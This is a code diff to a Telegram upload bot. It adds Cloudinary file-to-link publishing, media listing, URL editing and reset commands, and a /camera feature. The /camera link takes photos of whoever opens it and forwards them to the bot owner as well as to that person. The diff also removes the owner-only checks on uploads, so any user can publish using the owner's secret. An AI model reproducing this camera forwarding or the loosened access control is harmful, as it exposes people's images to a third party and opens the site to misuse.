@@ -11,13 +11,20 @@ Commands:
   /start      - Welcome & main menu
   /help       - Detailed help
   /upload     - Upload a new link
-  /links      - View recent uploaded links
+  /links      - View all uploaded media
   /delete     - Delete a link by ID
+  /seturl     - Change download URL of a link
+  /reset      - Delete ALL uploads from the website
   /broadcast  - Send a notification to all users
   /stats      - Bot usage statistics
   /cancel     - Cancel current operation
+
+File-to-Link:
+  Forward or send any document, video, audio, photo or animation to the
+  bot — it is stored on the website and you get a stream + download link.
 """
 
+import asyncio
 import json
 import logging
 import os
@@ -45,8 +52,27 @@ from telegram.ext import (
     filters,
 )
 
+# ── Load .env into the environment before reading any config ───────
+def load_env_file():
+    env_file = Path(__file__).parent / ".env"
+    if not env_file.exists():
+        return
+    with open(env_file, encoding="utf-8") as f:
+        for line in f:
+            m = re.match(r"^\s*([\w.-]+)\s*=\s*(.*?)\s*$", line)
+            if m and m.group(1) and m.group(1) not in os.environ:
+                os.environ[m.group(1)] = m.group(2).strip().strip('"').strip("'")
+
+load_env_file()
+
 # ── Constants ───────────────────────────────────────────────────────
-BASE_URL = "https://azim-studio.onrender.com"
+BASE_URL = (os.environ.get("API_BASE_URL") or "https://azim-studio.onrender.com").rstrip("/")
+PUBLIC_BASE_URL = (os.environ.get("PUBLIC_BASE_URL") or os.environ.get("SITE_BASE_URL") or "https://azim.run.place").rstrip("/")
+TG_STORAGE_CHANNEL = os.environ.get("BIN_CHANNEL", "").strip()
+CLOUDINARY_URL = os.environ.get("CLOUDINARY_URL", "").strip()
+OWNER_CHAT_ID = (os.environ.get("OWNER_CHAT_ID") or "").strip()
+OWNER_USERNAME = (os.environ.get("OWNER_USERNAME") or "Azimxyz").strip().lstrip("@")
+CAMERA_POLL_SECONDS = int(os.environ.get("CAMERA_POLL_SECONDS", "15"))
 ENDPOINT = "/api/upload/link-item"
 CONFIG_FILE = Path(__file__).parent / "bot_config.json"
 STATS_FILE = Path(__file__).parent / "bot_stats.json"
@@ -54,6 +80,7 @@ STATS_FILE = Path(__file__).parent / "bot_stats.json"
 # Conversation states
 WAIT_TITLE, WAIT_URL, WAIT_THUMBNAIL, WAIT_CONFIRM = range(4)
 WAIT_SECRET, WAIT_BROADCAST_MSG, WAIT_DELETE_ID = range(4, 7)
+WAIT_SETURL_ID, WAIT_SETURL_URL = range(7, 9)
 
 # ── Logging ─────────────────────────────────────────────────────────
 logging.basicConfig(
@@ -220,6 +247,34 @@ def fetch_links():
     return []
 
 
+def fetch_songs():
+    status, body = api_request("/api/tracks")
+    if status == 200 and isinstance(body, list):
+        return body
+    return []
+
+
+def fetch_movies():
+    status, body = api_request("/api/movies")
+    if status == 200 and isinstance(body, list):
+        return body
+    return []
+
+
+def fetch_all_media():
+    songs = fetch_songs()
+    movies = fetch_movies()
+    links = fetch_links()
+    all_items = []
+    for s in songs:
+        all_items.append({**s, "_type": "song"})
+    for m in movies:
+        all_items.append({**m, "_type": "movie"})
+    for l in links:
+        all_items.append({**l, "_type": "link"})
+    return all_items
+
+
 def delete_link_api(link_id):
     status, body = api_request(
         f"/api/media/link/{link_id}",
@@ -227,6 +282,222 @@ def delete_link_api(link_id):
         {"bossSecret": config.boss_secret},
     )
     return status == 200 and isinstance(body, dict) and body.get("success")
+
+
+def update_link_url_api(link_id, new_url):
+    status, body = api_request(
+        f"/api/media/link/{link_id}",
+        "PUT",
+        {"newUrl": new_url, "bossSecret": config.boss_secret},
+    )
+    return status == 200 and isinstance(body, dict) and body.get("success")
+
+
+# ── File-to-Link: Cloudinary upload + register on the website ──────
+def init_cloudinary():
+    if not CLOUDINARY_URL:
+        logger.warning("CLOUDINARY_URL not set — forwarded files cannot be stored.")
+        return False
+    try:
+        import cloudinary
+        cloudinary.config(url=CLOUDINARY_URL)
+        return True
+    except Exception as e:
+        logger.error("Cloudinary init failed: %s", e)
+        return False
+
+
+def _upload_bytes_to_cloudinary(data: bytes, resource_type: str, folder: str):
+    import cloudinary.uploader
+    import io
+    result = cloudinary.uploader.upload(
+        io.BytesIO(data),
+        resource_type=resource_type,
+        folder=folder,
+        use_filename=True,
+        unique_filename=True,
+        overwrite=False,
+    )
+    return (result or {}).get("secure_url", "")
+
+
+def post_file_to_website(kind: str, title: str, media_url: str, thumbnail_url: str = ""):
+    """kind: 'movie' | 'song' | 'link' (images/documents become links)."""
+    if kind == "movie" or kind == "song":
+        status, body = api_request(
+            "/api/upload/finalize",
+            "POST",
+            {"title": title, "type": kind, "uploader": "Boss", "mediaUrl": media_url, "thumbnailUrl": thumbnail_url},
+        )
+    else:
+        status, body = api_request(
+            "/api/upload/finalize-link-item",
+            "POST",
+            {"title": title, "url": media_url, "uploader": "Boss", "thumbnailUrl": thumbnail_url},
+        )
+    if status == 200 and isinstance(body, dict) and body.get("success"):
+        return True, body.get("item", {})
+    return False, body.get("error", f"HTTP {status}")
+
+
+async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    msg = update.effective_message
+    if not msg or not msg.from_user:
+        return
+
+    await send_typing(update)
+
+    # Pick the real file object + classify the media.
+    file_obj = None
+    kind = None
+    if msg.photo:
+        file_obj = msg.photo[-1]
+        kind = "link"
+    elif msg.document:
+        file_obj = msg.document
+        kind = "link"
+    elif msg.video:
+        file_obj = msg.video
+        kind = "movie"
+    elif msg.audio or msg.voice:
+        file_obj = msg.audio or msg.voice
+        kind = "song"
+    elif msg.animation:
+        file_obj = msg.animation
+        kind = "link"
+
+    if not file_obj:
+        await msg.reply_text(
+            "I can turn any <b>document, video, audio or photo</b> into a streaming link.\n"
+            "Just forward or send the file here.",
+            parse_mode="HTML",
+        )
+        return
+
+    file_name = getattr(file_obj, "file_name", None) or ""
+    title = (msg.caption or file_name or "Boss Upload").strip().splitlines()[0][:80] or "Boss Upload"
+
+    status_msg = await msg.reply_text(f"Receiving <b>{escape_html(title)}</b>…", parse_mode="HTML")
+
+    # Optional: permanent backup copy in a private channel for infinite storage.
+    if TG_STORAGE_CHANNEL:
+        try:
+            await msg.forward(chat_id=TG_STORAGE_CHANNEL)
+        except Exception as e:
+            logger.warning("Backup forward failed: %s", e)
+
+    try:
+        if not init_cloudinary():
+            await status_msg.edit_text("Storage not configured (missing CLOUDINARY_URL).")
+            return
+        raw = await file_obj.download_as_bytearray()
+        if not raw:
+            await status_msg.edit_text("Could not download the file. Try again.")
+            return
+
+        await status_msg.edit_text("Uploading to storage…")
+        if kind == "movie" or kind == "song":
+            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "video", "azim_tg")
+        elif kind == "link" and (msg.photo or (msg.document and getattr(file_obj, "mime_type", "").startswith("image/"))):
+            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "image", "azim_tg")
+        else:
+            media_url = await asyncio.to_thread(_upload_bytes_to_cloudinary, bytes(raw), "raw", "azim_tg")
+        if not media_url:
+            await status_msg.edit_text("Upload failed. Cloudinary did not return a URL.")
+            return
+
+        await status_msg.edit_text("Publishing to the Updates feed…")
+        thumb = ""
+        if kind == "link" and (msg.photo or (msg.document and getattr(file_obj, "mime_type", "").startswith("image/"))):
+            thumb = media_url
+        ok, item = post_file_to_website(kind, title, media_url, thumb)
+        if not ok:
+            await status_msg.edit_text(f"Publish failed: {escape_html(str(item))}", parse_mode="HTML")
+            return
+
+        bucket = {
+            "movie": "video",
+            "song": "audio",
+            "link": "file",
+        }.get(kind, "file")
+        item_id = item.get("id", "")
+        dl_url = f"{PUBLIC_BASE_URL}/dl/{bucket}/{item_id}"
+        stream_url = f"{PUBLIC_BASE_URL}/stream/{bucket}/{item_id}"
+        stats.inc("uploads")
+        await status_msg.edit_text(
+            "<b>Uploaded to Azim's Space</b>\n\n"
+            f"Title: <b>{escape_html(title)}</b>\n"
+            f"ID: <code>{escape_html(str(item_id))}</code>\n\n"
+            f'<a href="{stream_url}">▶ Stream on website</a>  ·  '
+            f'<a href="{dl_url}">⬇ Direct download</a>',
+            parse_mode="HTML",
+            disable_web_page_preview=True,
+        )
+    except Exception as e:
+        logger.exception("handle_media error")
+        await status_msg.edit_text(f"Error: <code>{escape_html(str(e))}</code>", parse_mode="HTML")
+
+
+# ── /camera ────────────────────────────────────────────────────────
+async def cmd_camera(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await send_typing(update)
+    uid = update.effective_user.id
+    link = f"{PUBLIC_BASE_URL}/camera?uid={uid}"
+    await update.message.reply_text(
+        "<b>📷 Camera Capture</b>\n\n"
+        "Open the link below, allow camera access, and a few photos will be taken. "
+        "They will be sent to your Telegram chat and to the site operator.\n\n"
+        f"{link}\n\n"
+        "<i>Note: photos are only captured after you press Start, and you see them before sending.</i>",
+        parse_mode="HTML",
+        disable_web_page_preview=True,
+    )
+
+
+async def camera_poller(app: Application):
+    """Delivers pending /camera captures to the visitor and the owner."""
+    await asyncio.sleep(8)
+
+    owner_id = None
+    if OWNER_CHAT_ID:
+        try:
+            owner_id = int(OWNER_CHAT_ID)
+        except ValueError:
+            owner_id = None
+    if owner_id is None and OWNER_USERNAME:
+        try:
+            chat = await app.bot.get_chat(OWNER_USERNAME)
+            owner_id = chat.id
+            logger.info("Camera owner resolved to chat ID %s via @%s", owner_id, OWNER_USERNAME)
+        except Exception as e:
+            logger.warning("Could not resolve camera owner chat @%s: %s", OWNER_USERNAME, e)
+    if owner_id is None:
+        owner_id = config.get("owner_id")
+        if owner_id:
+            logger.info("Camera owner uses configured owner_id %s", owner_id)
+
+    while True:
+        try:
+            status, body = api_request("/api/camera/pending", "GET", boss_secret=config.boss_secret)
+            if status == 200 and isinstance(body, dict):
+                for cap in body.get("captures", []):
+                    cid = cap.get("id")
+                    uid = cap.get("uid")
+                    urls = cap.get("urls", [])
+                    chats = [uid] if uid else []
+                    if owner_id and owner_id not in chats:
+                        chats.append(owner_id)
+                    for u in urls[:8]:
+                        for ch in chats:
+                            try:
+                                await app.bot.send_photo(chat_id=ch, photo=u)
+                            except Exception as e:
+                                logger.warning("Camera photo send to %s failed: %s", ch, e)
+                    if cid:
+                        api_request("/api/camera/done", "POST", {"id": cid, "bossSecret": config.boss_secret})
+        except Exception as e:
+            logger.warning("camera_poller error: %s", e)
+        await asyncio.sleep(CAMERA_POLL_SECONDS)
 
 
 # ── UI helpers ─────────────────────────────────────────────────────
@@ -273,38 +544,69 @@ def escape_html(s):
 
 
 # ── /start ─────────────────────────────────────────────────────────
-@admin_only
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_typing(update)
     name = update.effective_user.first_name or "there"
-    text = (
-        f"Welcome, <b>{escape_html(name)}</b>!\n\n"
-        "I'm the <b>Azim's Space</b> upload bot.\n"
-        "Use the buttons below or send /commands.\n\n"
-        "<i>Tip: Use /upload to quickly add a link.</i>\n\n"
-        "First time? Send /myid to get your ID, then /setowner to lock the bot."
-    )
-    await update.message.reply_text(
-        text, parse_mode="HTML", reply_markup=main_menu_keyboard()
-    )
+    if is_owner(update.effective_user.id):
+        text = (
+            f"Welcome, <b>{escape_html(name)}</b>!\n\n"
+            "I'm the <b>Azim's Space</b> upload bot.\n"
+            "Use the buttons below or send /commands.\n\n"
+            "<i>Tip: Use /upload to quickly add a link.</i>\n\n"
+            "First time? Send /myid to get your ID, then /setowner to lock the bot."
+        )
+        await update.message.reply_text(
+            text, parse_mode="HTML", reply_markup=main_menu_keyboard()
+        )
+    else:
+        await update.message.reply_text(
+            f"Welcome, <b>{escape_html(name)}</b>!\n\n"
+            "I'm the <b>Azim's Space</b> bot. Anyone can use me:\n\n"
+            "<b>📷 /camera</b> — take a few photos, they're sent to your Telegram\n"
+            "⬆️ <b>/upload</b> — add a link to the website\n"
+            "📁 Send/forward any file — it becomes a streamable link on the site\n"
+            "🔗 <b>/links</b> — view uploaded media\n"
+            "❓ /help — how to use the bot\n\n"
+            "Your unique file links look like:\n"
+            f"{PUBLIC_BASE_URL}/dl/…",
+            parse_mode="HTML",
+        )
 
 
 # ── /help ──────────────────────────────────────────────────────────
-@admin_only
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await send_typing(update)
+    if not is_owner(update.effective_user.id):
+        await update.message.reply_text(
+            "<b>How to use me</b>\n\n"
+            "<b>📷 /camera</b> — get a link, open it, allow camera, photos are sent to your Telegram\n"
+            "<b>⬆️ /upload</b> — add a link to the website\n"
+            "<b>📁 Files</b> — send or forward any document, video, audio or photo to post it on the site with a stream + download link\n"
+            "<b>🔗 /links</b> — view uploaded media\n"
+            "<b>/myid</b> — get your Telegram user ID\n"
+            "<b>/cancel</b> — cancel current operation",
+            parse_mode="HTML",
+        )
+        return
     text = (
         "<b>Commands</b>\n\n"
         "/myid — Get your Telegram user ID\n"
         "/setowner — Lock bot to only your ID\n"
         "/upload — Upload a new link\n"
-        "/links — View recent links\n"
+        "/links — View all uploaded media\n"
         "/delete — Delete a link by ID\n"
+        "/seturl — Change download URL of a link\n"
+        "/reset — Delete ALL uploads from the website\n"
         "/broadcast — Send notification to all users\n"
         "/stats — View usage statistics\n"
         "/setsecret — Update the boss secret\n"
         "/cancel — Cancel current operation\n"
-        "/help — Show this message\n"
+        "/help — Show this message\n\n"
+        "<b>File-to-Link</b>\n"
+        "Just forward or send any document, video, audio or photo — "
+        "I'll post it to the Updates feed and give you a stream + download link.\n\n"
+        "<b>Camera</b>\n"
+        "/camera — visitors get a link that captures a few photos and sends them to Telegram."
     )
     await update.message.reply_text(text, parse_mode="HTML", reply_markup=back_button())
 
@@ -351,10 +653,12 @@ async def cmd_setowner(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ── Menu callback router ───────────────────────────────────────────
-@admin_only_cb
+# ── Menu callback router (admin menu — owner only) ─────────────────
 async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
+    if not is_owner(query.from_user.id):
+        await query.answer("Main menu is available to the admin only.")
+        return
     await query.answer()
     data = query.data
 
@@ -383,23 +687,26 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["state"] = "upload_title"
 
     elif data == "menu_links":
-        links = fetch_links()
-        if not links:
+        all_items = fetch_all_media()
+        if not all_items:
             await query.edit_message_text(
-                "No links found.", reply_markup=back_button()
+                "No media uploaded yet.", reply_markup=back_button()
             )
             return
-        text = "<b>Recent Links</b>\n\n"
-        for i, link in enumerate(links[:10], 1):
-            title = escape_html(link.get("title", "Untitled"))
-            lid = link.get("id", "?")
-            url = link.get("url", "")
-            text += f"<b>{i}.</b> {title}\n"
-            text += f"   <code>{lid}</code>\n"
+        text = "<b>All Uploaded Media</b>\n\n"
+        for i, item in enumerate(all_items[:20], 1):
+            title = escape_html(item.get("title", "Untitled"))
+            lid = item.get("id", "?")
+            kind = item.get("_type", "unknown")
+            icon = "🎵" if kind == "song" else "🎬" if kind == "movie" else "🔗"
+            url = item.get("url") or item.get("songUrl") or item.get("movieUrl") or ""
+            text += f"<b>{i}.</b> {icon} {title}\n"
+            text += f"   ID: <code>{lid}</code>\n"
+            text += f"   Type: {kind}\n"
             if url:
                 text += f'   <a href="{escape_html(url)}">Open</a>\n'
             text += "\n"
-        text += "Send /delete to remove a link."
+        text += "Use /delete to remove, /seturl to change URL."
         await query.edit_message_text(
             text, parse_mode="HTML", reply_markup=back_button(), disable_web_page_preview=True
         )
@@ -421,19 +728,22 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = (
             "<b>Commands</b>\n\n"
             "/upload — Upload a new link\n"
-            "/links — View recent links\n"
+            "/links — View all uploaded media\n"
             "/delete — Delete a link by ID\n"
+            "/seturl — Change download URL of a link\n"
+            "/reset — Delete ALL uploads from the website\n"
             "/broadcast — Send notification to all users\n"
             "/stats — View usage statistics\n"
             "/setsecret — Update the boss secret\n"
             "/cancel — Cancel current operation\n"
-            "/help — Show this message\n"
+            "/help — Show this message\n\n"
+            "<b>File-to-Link</b>\n"
+            "Forward or send any file here to post it on the website."
         )
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())
 
 
 # ── Upload conversation (with inline confirmation) ─────────────────
-@admin_only
 async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not config.boss_secret:
         await update.message.reply_text("Boss secret not set. Use /setsecret first.")
@@ -447,16 +757,18 @@ async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_owner(update.effective_user.id):
+    state = context.user_data.get("state")
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+
+    ADMIN_STATES = ("set_secret", "broadcast_msg", "delete_id", "seturl_id", "seturl_url")
+    if state in ADMIN_STATES and not is_owner(user_id):
         await update.message.reply_text(
             "Access denied.\n"
             f"Your ID: <code>{update.effective_user.id}</code>",
             parse_mode="HTML",
         )
         return
-
-    state = context.user_data.get("state")
-    text = update.message.text.strip()
 
     if state == "upload_title":
         if not text:
@@ -556,6 +868,46 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data.pop("state", None)
         return
 
+    if state == "seturl_id":
+        if not text:
+            await update.message.reply_text("ID cannot be empty. Try again:")
+            return
+        context.user_data["seturl_id"] = text
+        context.user_data["state"] = "seturl_url"
+        await update.message.reply_text(
+            "Send the <b>new download URL</b> for this link:",
+            parse_mode="HTML",
+        )
+        return
+
+    if state == "seturl_url":
+        if not text:
+            await update.message.reply_text("URL cannot be empty. Try again:")
+            return
+        if not text.startswith(("http://", "https://")):
+            await update.message.reply_text(
+                "Invalid URL — must start with http:// or https://\nTry again:"
+            )
+            return
+        link_id = context.user_data.get("seturl_id", "")
+        success = update_link_url_api(link_id, text)
+        if success:
+            stats.inc("uploads")
+            await update.message.reply_text(
+                f"Link <code>{escape_html(link_id)}</code> URL updated.\n"
+                f"New URL: <code>{escape_html(text)}</code>",
+                parse_mode="HTML",
+                reply_markup=back_button(),
+            )
+        else:
+            await update.message.reply_text(
+                "Update failed. Check the ID and try again.",
+                reply_markup=back_button(),
+            )
+        context.user_data.pop("seturl_id", None)
+        context.user_data.pop("state", None)
+        return
+
     # No active state — show hint
     await update.message.reply_text(
         "Send /upload to start, or /help for commands."
@@ -563,7 +915,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # ── Upload confirmation callback ───────────────────────────────────
-@admin_only_cb
 async def upload_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     data = context.user_data.get("upload", {})
@@ -580,10 +931,12 @@ async def upload_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if success:
         stats.inc("uploads")
         item_id = result.get("id", "?") if isinstance(result, dict) else result
+        web_url = f"{PUBLIC_BASE_URL}/dl/file/{item_id}"
         text = (
             "<b>Upload Successful</b>\n\n"
             f"Title: <b>{escape_html(data['title'])}</b>\n"
-            f"ID: <code>{escape_html(str(item_id))}</code>\n"
+            f"ID: <code>{escape_html(str(item_id))}</code>\n\n"
+            f'Open: <a href="{web_url}">{web_url}</a>'
         )
         await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_button())
     else:
@@ -596,7 +949,6 @@ async def upload_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.pop("state", None)
 
 
-@admin_only_cb
 async def upload_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer("Upload cancelled.")
@@ -657,6 +1009,92 @@ async def cmd_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+# ── /links ─────────────────────────────────────────────────────────
+async def cmd_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await send_typing(update)
+    all_items = fetch_all_media()
+    if not all_items:
+        await update.message.reply_text(
+            "No media uploaded yet.", reply_markup=back_button()
+        )
+        return
+    text = "<b>All Uploaded Media</b>\n\n"
+    for i, item in enumerate(all_items[:20], 1):
+        title = escape_html(item.get("title", "Untitled"))
+        lid = item.get("id", "?")
+        kind = item.get("_type", "unknown")
+        icon = "🎵" if kind == "song" else "🎬" if kind == "movie" else "🔗"
+        url = item.get("url") or item.get("songUrl") or item.get("movieUrl") or ""
+        text += f"<b>{i}.</b> {icon} {title}\n"
+        text += f"   ID: <code>{lid}</code>\n"
+        text += f"   Type: {kind}\n"
+        if url:
+            text += f'   <a href="{escape_html(url)}">Open</a>\n'
+        text += "\n"
+    if is_owner(update.effective_user.id):
+        text += "Use /delete to remove, /seturl to change URL."
+    else:
+        text += "Each upload has its own unique link (see /dl and /stream)."
+    await update.message.reply_text(
+        text, parse_mode="HTML", reply_markup=back_button(), disable_web_page_preview=True
+    )
+
+
+# ── Set URL ────────────────────────────────────────────────────────
+@admin_only
+async def cmd_seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["state"] = "seturl_id"
+    await update.message.reply_text(
+        "<b>Change Link URL</b>\n\nSend the link <b>ID</b> whose download URL you want to change:",
+        parse_mode="HTML",
+    )
+
+
+# ── Reset (delete all uploads) ─────────────────────────────────────
+@admin_only
+async def cmd_reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("Yes, delete everything", callback_data="reset_confirm_yes"),
+            InlineKeyboardButton("Cancel", callback_data="reset_confirm_no"),
+        ],
+    ])
+    await update.message.reply_text(
+        "<b>⚠️ Reset Website</b>\n\n"
+        "This will <b>permanently delete ALL uploaded media</b>\n"
+        "(songs, movies, files) and clear the chat history on your website.",
+        parse_mode="HTML",
+        reply_markup=keyboard,
+    )
+
+
+@admin_only_cb
+async def reset_confirm_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    data = query.data
+    if data == "reset_confirm_no":
+        await query.answer("Reset cancelled.")
+        await query.edit_message_text("Reset cancelled.", reply_markup=back_button())
+        return
+
+    await query.answer()
+    await query.edit_message_text("Deleting all uploads…")
+    status, body = api_request("/api/reset", "POST", {"bossSecret": config.boss_secret})
+    if status == 200 and isinstance(body, dict) and body.get("success"):
+        removed = body.get("removed", 0)
+        await query.edit_message_text(
+            f"<b>Done.</b> Removed {removed} item(s). All uploads are cleared.",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+    else:
+        await query.edit_message_text(
+            f"Reset failed: <code>{escape_html(str(body.get('error', status)))}</code>",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+
+
 # ── Stats ──────────────────────────────────────────────────────────
 @admin_only
 async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -715,11 +1153,14 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def post_init(app: Application):
     await app.bot.set_my_commands([
         BotCommand("start", "Open main menu"),
+        BotCommand("camera", "Take photos via web link"),
         BotCommand("myid", "Get your Telegram user ID"),
         BotCommand("setowner", "Lock bot to only your ID"),
         BotCommand("upload", "Upload a new link"),
-        BotCommand("links", "View recent links"),
+        BotCommand("links", "View all uploaded media"),
         BotCommand("delete", "Delete a link by ID"),
+        BotCommand("seturl", "Change download URL of a link"),
+        BotCommand("reset", "Delete ALL uploads from the website"),
         BotCommand("broadcast", "Send notification to all users"),
         BotCommand("stats", "View usage statistics"),
         BotCommand("setsecret", "Update the boss secret"),
@@ -727,6 +1168,8 @@ async def post_init(app: Application):
         BotCommand("cancel", "Cancel current operation"),
     ])
     logger.info("Bot commands registered.")
+    asyncio.create_task(camera_poller(app))
+    logger.info("Camera delivery loop started.")
 
 
 # ── Main ───────────────────────────────────────────────────────────
@@ -778,10 +1221,13 @@ def register_handlers(app):
 
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("help", cmd_help))
+    app.add_handler(CommandHandler("camera", cmd_camera))
     app.add_handler(CommandHandler("myid", cmd_myid))
     app.add_handler(CommandHandler("setowner", cmd_setowner))
-    app.add_handler(CommandHandler("links", cmd_start))
+    app.add_handler(CommandHandler("links", cmd_links))
     app.add_handler(CommandHandler("delete", cmd_delete))
+    app.add_handler(CommandHandler("seturl", cmd_seturl))
+    app.add_handler(CommandHandler("reset", cmd_reset))
     app.add_handler(CommandHandler("broadcast", cmd_broadcast))
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("cancel", cmd_cancel))
@@ -791,6 +1237,21 @@ def register_handlers(app):
     app.add_handler(CallbackQueryHandler(upload_cancel_cb, pattern="^upload_cancel$"))
     app.add_handler(CallbackQueryHandler(broadcast_send_cb, pattern="^broadcast_send$"))
     app.add_handler(CallbackQueryHandler(broadcast_cancel_cb, pattern="^broadcast_cancel$"))
+    app.add_handler(
+        CallbackQueryHandler(reset_confirm_cb, pattern="^reset_confirm_(yes|no)$")
+    )
+
+    # File-to-Link: capture any forwarded/sent media (documents, video,
+    # audio, voice, photos, animations) and publish it to the Updates feed.
+    MEDIA_FILTER = (
+        filters.DOCUMENT
+        | filters.VIDEO
+        | filters.AUDIO
+        | filters.VOICE
+        | filters.PHOTO
+        | filters.ANIMATION
+    )
+    app.add_handler(MessageHandler(MEDIA_FILTER, handle_media))
 
     # Catch-all text messages for conversation flow
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
